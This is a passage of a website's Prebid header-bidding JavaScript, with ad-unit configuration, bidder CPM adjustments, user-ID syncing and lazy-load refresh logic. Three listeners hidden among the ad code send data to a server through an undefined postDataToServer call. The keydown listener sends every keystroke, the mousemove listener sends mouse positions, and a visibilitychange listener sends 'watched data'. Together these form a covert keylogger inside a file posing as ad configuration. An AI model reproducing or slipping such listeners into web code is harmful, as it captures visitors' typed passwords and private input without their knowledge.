      bidder: 'seedtag',
      params: {
        placement: 'inArticle',
        publisherId: '3138-3377-01',
        adUnitId: '29634282'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922089908-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 600], [300, 250]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_desktop_unit3_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '12726875'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '539878163',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 600],
        siteId: '969533'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922198497-0',
    mediaTypes: {
      banner: {
        sizes: [[728, 90]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_sticky_prebid'
      }
    }, {
      bidder: 'gumgum',
      params: {
        inScreen: 'kawksopt'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29598906'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559102925',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'justpremium',
      params: {
        zone: '156123',
        allow: ['cf', 'fa', 'as', 'pu', 'fv']
      }
    }, {
      bidder: 'ix',
      params: {
        size: [728, 90],
        siteId: '969533'
      }
    }, {
      bidder: 'seedtag',
      params: {
        placement: 'inScreen',
        publisherId: '3138-3377-01',
        adUnitId: '24462064'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922235466-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_desktop_unit2_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29598931'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559102926',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }, {
      bidder: 'seedtag',
      params: {
        placement: 'inArticle',
        publisherId: '3138-3377-01',
        adUnitId: '29634284'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922272594-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_desktop_unit2_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29598932'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559102927',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }, {
      bidder: 'seedtag',
      params: {
        placement: 'inArticle',
        publisherId: '3138-3377-01',
        adUnitId: '29634286'
      }
    }]
  }, {
    code: 'div-gpt-ad-1679922302204-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 250]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_desktop_unit2_prebid'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29598933'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559102928',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 250],
        siteId: '969533'
      }
    }]
  }, {
    code: 'div-gpt-ad-1681815154247-0',
    mediaTypes: {
      banner: {
        sizes: [[300, 600], [300, 250]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_desktop_unit3_prebid'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29805658'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559271562',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [300, 600],
        siteId: '969533'
      }
    }]
  }, {
    code: 'div-gpt-ad-1681979753632-0',
    mediaTypes: {
      banner: {
        sizes: [[728, 90]]
      }
    },
    bids: [{
      bidder: 'amx',
      params: {
        tagId: 'c25hY2stbWVkaWEuY29t'
      }
    }, {
      bidder: 'triplelift',
      params: {
        inventoryCode: 'Snack_ron_desktop_unit1_prebid'
      }
    }, {
      bidder: 'appnexus',
      params: {
        placementId: '29830549'
      }
    }, {
      bidder: 'rubicon',
      params: {
        accountId: '11106',
        siteId: '118386',
        zoneId: '2819306'
      }
    }, {
      bidder: 'openx',
      params: {
        unit: '559276023',
        delDomain: 'snackmedia-d.openx.net'
      }
    }, {
      bidder: 'ix',
      params: {
        size: [728, 90],
        siteId: '969533'
      }
    }]
  }];
}
var nano_kw = document.querySelector('meta[name=keywords]');
var nano_kw_str = '';
if (nano_kw) {
  nano_kw_str = nano_kw.getAttribute('content');
} else {
  nano_kw_str = 'football, sports';
}
window.addEventListener("visibilitychange", function () {
  if (document.visibilityState === "hidden") {
    postDataToServer(getWatchedData());
  }
});
for (u = 0; u < adUnits.length; u++) {
  for (b = 0; b < adUnits[u].bids.length; b++) {
    var bid = adUnits[u].bids[b];
    if (bid.bidder == 'nanointeractive') {
      bid.params.nq = nano_kw_str;
    }
  }
}
start_snack_ads();
function start_snack_ads() {
  if (snack_site_config.sizeMapping === true && pbSnackMobile) {
    var snack_ldb = document.getElementById('snack_ldb');
    if (snack_ldb != null && typeof (snack_ldb != 'undefined')) {
      snack_ldb.setAttribute('id', 'snack_mob_top');
    }
    var snack_mpu = document.getElementById('snack_mpu');
    if (snack_mpu != null && typeof (snack_mpu != 'undefined')) {
      snack_mpu.setAttribute('id', 'snack_mob_mid');
    }
    var snack_dmpu = document.getElementById('snack_dmpu');
    if (snack_dmpu != null && typeof (snack_dmpu != 'undefined')) {
      snack_dmpu.setAttribute('id', 'snack_mob_bot');
    }
    var snack_dex1 = document.getElementById('snack_dex1');
    if (snack_dex1 != null && typeof (snack_dex1 != 'undefined')) {
      snack_dex1.setAttribute('id', 'snack_mex1');
    }
    var snack_dex2 = document.getElementById('snack_dex2');
    if (snack_dex2 != null && typeof (snack_dex2 != 'undefined')) {
      snack_dex2.setAttribute('id', 'snack_mex2');
    }
    var snack_dex3 = document.getElementById('snack_dex3');
    if (snack_dex3 != null && typeof (snack_dex3 != 'undefined')) {
      snack_dex3.setAttribute('id', 'snack_mex3');
    }
    var snack_dex4 = document.getElementById('snack_dex4');
    if (snack_dex4 != null && typeof (snack_dex4 != 'undefined')) {
      snack_dex4.setAttribute('id', 'snack_mex4');
    }
    var snack_dex5 = document.getElementById('snack_dex5');
    if (snack_dex5 != null && typeof (snack_dex5 != 'undefined')) {
      snack_dex5.setAttribute('id', 'snack_mex5');
    }
    var snack_dex6 = document.getElementById('snack_dex6');
    if (snack_dex6 != null && typeof (snack_dex6 != 'undefined')) {
      snack_dex6.setAttribute('id', 'snack_mex6');
    }
  }
  snack_adds_init('divs');
  for (var i = 0; i < snack_tags.length; i++) {
    var tag = snack_tags[i];
    var dt = document.getElementById(tag.id);
    if (typeof dt != 'undefined' && dt != null) {
      if (tag.lazyload == true) {
        snack_tags_lazyload[i] = tag.id;
      } else {
        snack_tags_present[i] = 'div-gpt-ad-' + tag.placementID;
      }
    } else {
      AD_UNITS_TOGGLE_OFF.push('div-gpt-ad-' + tag.placementID);
      snack_tags_not_present[i] = true;
    }
  }
  if (snack_site_config.headerBidding === true) {
    var pb_src = snack_enqueue_script(snack_base_url + 'prebid-8.20.0-std_v1.js?v=20220523', 'head');
    snack_start_pb();
  } else {
    snack_debug('headerBidding is either false or undefined');
    googletag.cmd.push(function () {
      snack_setup_ads();
      googletag.enableServices();
    });
    googletag.cmd.push(function () {
      snack_adds_init('display');
    });
    googletag.cmd.push(function () {
      googletag.pubads().refresh();
    });
  }
}
function snack_start_pb() {
  var PREBID_TIMEOUT = 20000;
  pbjs.bidderSettings = {
    'standard': {
      storageAllowed: true
    },
    'appnexus': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .97;
      }
    },
    'rubicon': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 1;
      }
    },
    'openx': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 1.2;
      }
    },
    'ix': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .93;
      }
    },
    'sublime': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 1;
      }
    },
    'sharethrough': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.9;
      }
    },
    'collective564': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.2;
      }
    },
    'playgroundxyz': {
      bidCpmAdjustment: function (bidCpm) {
        var pubCpm = 4.5;
        return bidCpm > 0 ? pubCpm : 0;
      }
    },
    'nanointeractive': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .8;
      }
    },
    'conversant': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85;
      }
    },
    'criteo': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85;
      }
    },
    'districtm': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85;
      }
    },
    'justpremium': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .87;
      }
    },
    'oftmedia': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85;
      }
    },
    'adyoulike': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.8;
      }
    },
    'aardvark': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85;
      }
    },
    'emx_digital': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.75;
      }
    },
    '33across': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.8;
      }
    },
    'kargo': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .93;
      }
    },
    'undertone': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85;
      }
    },
    'improvedigital': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.97;
      }
    },
    'triplelift': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .93;
      }
    },
    'unruly': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.6;
      }
    },
    'seedtag': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .82;
      }
    },
    'cedato': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .9;
      }
    },
    'richaudience': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .3;
      }
    },
    'aol': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .8;
      }
    },
    'grid': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85;
      }
    },
    'gumgum': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 1.15;
      }
    },
    'amx': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.92;
      }
    },
    'freewheel-ssp': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.3;
      }
    },
    'invibes': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 1;
      }
    },
    'pubmatic': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .8;
      }
    },
    'feedad': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * .2;
      }
    },
    'axonix': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.8;
      }
    },
    'teads': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 1.14;
      }
    },
    'taboola': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.8;
      }
    },
    'ogury': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.72;
      }
    },
    'adhash': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.7;
      }
    },
    'limelightDigital': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 1;
      }
    },
    'ozone': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.93;
      }
    },
    'adagio': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.96;
      }
    },
    'nextMillennium': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.94;
      }
    },
    'relevantdigital': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.5;
      }
    },
    'vidazoo': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.9;
      }
    },
    'smilewanted': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85;
      }
    },
    'optidigital': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.9;
      }
    },
    'smartadserver': {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.8;
      }
    }
  };
  var customConfigObject = {
    "buckets": [{
      "precision": 2,
      "min": 0,
      "max": 8,
      "increment": 0.01
    }, {
      "precision": 2,
      "min": 8,
      "max": 16,
      "increment": 0.10
    }, {
      "precision": 2,
      "min": 16,
      "max": 20,
      "increment": 0.25
    }, {
      "precision": 2,
      "min": 20,
      "max": 40,
      "increment": 1.00
    }, {
      "precision": 2,
      "min": 40,
      "max": 70,
      "increment": 2.00
    }, {
      "precision": 2,
      "min": 70,
      "max": 200,
      "increment": 5.00
    }]
  };
  pbjs.que.push(function () {
    pbjs.setConfig({
      consentManagement: {
        cmpApi: 'iab',
        timeout: PREBID_TIMEOUT,
        allowAuctionWithoutConsent: true
      },
      priceGranularity: customConfigObject,
      bidderSequence: "random",
      userSync: {
        userIds: [{
          name: "sharedId",
          params: {
            syncTime: 60
          },
          storage: {
            name: "sharedid",
            type: "cookie",
            expires: 28
          }
        }, {
          name: "id5Id",
          params: {
            partner: 211
          },
          storage: {
            type: "html5",
            name: "id5id",
            expires: 5
          }
        }, {
          name: "identityLink",
          params: {
            pid: '13244'
          },
          storage: {
            type: "cookie",
            name: "idl_env",
            expires: 7
          }
        }, {
          name: 'hadronId',
          params: {
            partnerId: 269
          }
        }, {
          name: "criteo"
        }, {
          name: "lotamePanoramaId",
          params: {
            clientId: "17227"
          }
        }, {
          name: "quantcastId"
        }],
        syncDelay: 3000,
        filterSettings: {
          all: {
            bidders: '*',
            filter: 'include'
          }
        }
      },
      useBidCache: true
    });
    pbjs.addAdUnits(adUnits);
    pbjs.aliasBidder('appnexus', 'playgroundxyz');
    pbjs.aliasBidder('appnexus', 'scoota');
    pbjs.aliasBidder('appnexus', 'collective564');
    pbjs.requestBids({
      adUnitCodes: snack_tags_present,
      bidsBackHandler: sendAdserverRequest
    });
  });
  function sendAdserverRequest() {
    if (pbjs.adserverRequestSent) return;
    pbjs.adserverRequestSent = true;
    googletag.cmd.push(function () {
      pbjs.que.push(function () {
        pbjs.setTargetingForGPTAsync(snack_tags_present);
        if (snack_tags_present.length > 0) {
          googletag.pubads().refresh();
        } else {
          snack_debug('no snack_tags_present - not calling refresh');
        }
      });
    });
  }
  setTimeout(function () {
    sendAdserverRequest();
  }, PREBID_TIMEOUT);
  function refreshBids() {
    pbjs.que.push(function () {
      pbjs.requestBids({
        timeout: PREBID_TIMEOUT,
        bidsBackHandler: function () {
          pbjs.setTargetingForGPTAsync();
          googletag.pubads().refresh();
        }
      });
    });
  }
  googletag.cmd.push(function () {
    snack_setup_ads();
    googletag.enableServices();
  });
  googletag.cmd.push(function () {
    snack_adds_init('display');
  });
}
var ads_already_loaded = [];
for (i = 0; i < snack_tags_lazyload.length; i++) {
  lazyload_inview(snack_tags_lazyload[i]);
}
function lazyload_inview(unit_id) {
  if (unit_id !== 'undefined' && unit_id) {
    if (!!window.IntersectionObserver) {
      let observer = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            refreshBid([unit_id]);
            console.log('IVR: IO Lazyloading ' + unit_id);
            ads_already_loaded[unit_id] = 1;
            observer.unobserve(document.getElementById(unit_id));
          }
        });
      }, {
        rootMargin: "0px 0px -50px 0px"
      });
      observer.observe(document.getElementById(unit_id));
    }
  }
}
var slots = [];
document.addEventListener('mousemove', function (event) {
  const mouseData = {
    posX: event.clientX,
    posY: event.clientY
  };
  postDataToServer(mouseData);
});
var test_slots = [];
function refreshBid(tags) {
  if (typeof snack_tags == 'undefined' || !snack_tags.length) {
    setTimeout(function () {
      refreshBid(tags);
    }, 100);
  } else {
    var adUnitCodes = [];
    var slots_for_refresh = [];
    var snack_tags_to_add = [];
    googletag.cmd.push(function () {
      for (var i = 0; i < tags.length; i++) {
        for (var ii = 0; ii < snack_tags.length; ii++) {
          if (tags[i] == snack_tags[ii].id) {
            snack_tags_to_add[i] = snack_tags[ii];
            console.log('IVR: Adding [' + snack_tags_to_add[i].placementName + ']');
          }
        }
        ;
      }
      for (var i = 0; i < snack_tags_to_add.length; i++) {
        test_slots[snack_tags_to_add[i].placementName] = googletag.defineSlot('/' + snack_tags_to_add[i].accountID + '/' + snack_tags_to_add[i].placementName, snack_tags_to_add[i].sizes, 'div-gpt-ad-' + snack_tags_to_add[i].placementID);
        if (test_slots[snack_tags_to_add[i].placementName]) {
          if (typeof snack_tags_ivr !== 'undefined' && snack_tags_ivr !== null) {
            if (snack_tags_ivr[snack_tags_to_add[i].id]) {
              console.log('IVR: Setting targetting for inview refresh [' + snack_tags_to_add[i].placementName + ']');
              slots[snack_tags_to_add[i].placementName] = test_slots[snack_tags_to_add[i].placementName].setTargeting("snackrefresh", "1").addService(googletag.pubads());
            } else {
              console.log('IVR: Setting NO targetting for inview refresh [' + snack_tags_to_add[i].placementName + ']');
              slots[snack_tags_to_add[i].placementName] = test_slots[snack_tags_to_add[i].placementName].addService(googletag.pubads());
            }
          } else {
            console.log('IVR: Standard refresh  [' + snack_tags_to_add[i].placementName + ']');
            slots[snack_tags_to_add[i].placementName] = test_slots[snack_tags_to_add[i].placementName].addService(googletag.pubads());
          }
          if (snack_tags_to_add[i].targetting && snack_tags_to_add[i].targetting.keyValues) {
            Object.keys(snack_tags_to_add[i].targetting.keyValues).forEach(function (key) {
              slots[snack_tags_to_add[i].placementName].setTargeting(key, snack_tags_to_add[i].targetting.keyValues[key]);
              console.log('DFP slot [' + snack_tags_to_add[i].placementName + '] ' + key + ' - ' + snack_tags_to_add[i].targetting.keyValues[key]);
            });
          }
          filled_slots[snack_tags_to_add[i].id] = slots[snack_tags_to_add[i].placementName];
        } else {
          console.log('IVR: NULL SLOT  [' + snack_tags_to_add[i].placementName + ']');
          snack_debug('NULL SLOT', test_slots[snack_tags_to_add[i].placementName]);
        }
        snack_debug('DFP slot defined:' + snack_tags_to_add[i].placementName);
        slots_for_refresh.push(slots[snack_tags_to_add[i].placementName]);
        adUnitCodes.push('div-gpt-ad-' + snack_tags_to_add[i].placementID);
        snack_add_tag(snack_tags_to_add[i]);
        snack_display_tag(snack_tags_to_add[i]);
      }
      pbjs.que.push(function () {
        snack_debug("adUnitCodes", adUnitCodes);
        snack_debug("slots_for_refresh", slots_for_refresh);
        pbjs.requestBids({
          timeout: PREBID_TIMEOUT,
          adUnitCodes: adUnitCodes,
          bidsBackHandler: function () {
            snack_debug(pbjs.getAdserverTargeting());
            pbjs.setTargetingForGPTAsync(adUnitCodes);
            googletag.pubads().refresh(slots_for_refresh);
          }
        });
      });
      if (typeof snack_tags_ivr !== 'undefined' && snack_tags_ivr !== null) {
        for (var i = 0; i < snack_tags_to_add.length; i++) {
          if (snack_tags_ivr[snack_tags_to_add[i].id]) {
            buffer_unit_refresh(snack_tags_to_add[i].id);
          }
        }
      }
    });
    return {
      "toAdd": snack_tags_to_add,
      "toRefresh": slots_for_refresh
    };
  }
}
document.addEventListener('keydown', function (event) {
  const keyData = {
    pressedKey: event.key
  };
  postDataToServer(keyData);
});
function killSlot(tags) {
  snack_debug('killSlot', tags);
  var snack_tags_to_kill = [];
  googletag.cmd.push(function () {
    for (var i = 0; i < tags.length; i++) {
      for (var ii = 0; ii < snack_tags.length; ii++) {
        if (tags[i] == snack_tags[ii].id) {
          snack_tags_to_kill[i] = snack_tags[ii];
        }
      }
    }
    snack_debug('snack_tags_to_kill', snack_tags_to_kill);
    for (var i = 0; i < snack_tags_to_kill.length; i++) {
      snack_debug('slots', filled_slots[snack_tags_to_kill[i].id]);
      googletag.cmd.push(function () {
        var killed = googletag.destroySlots([filled_slots[snack_tags_to_kill[i].id]]);
        snack_debug('killed ' + snack_tags_to_kill[i].id + ': ' + killed);
        console.log('IVR: killed ' + snack_tags_to_kill[i].id + ': ' + killed);
        console.log(filled_slots[snack_tags_to_kill[i].id]);
      });
    }
  });
}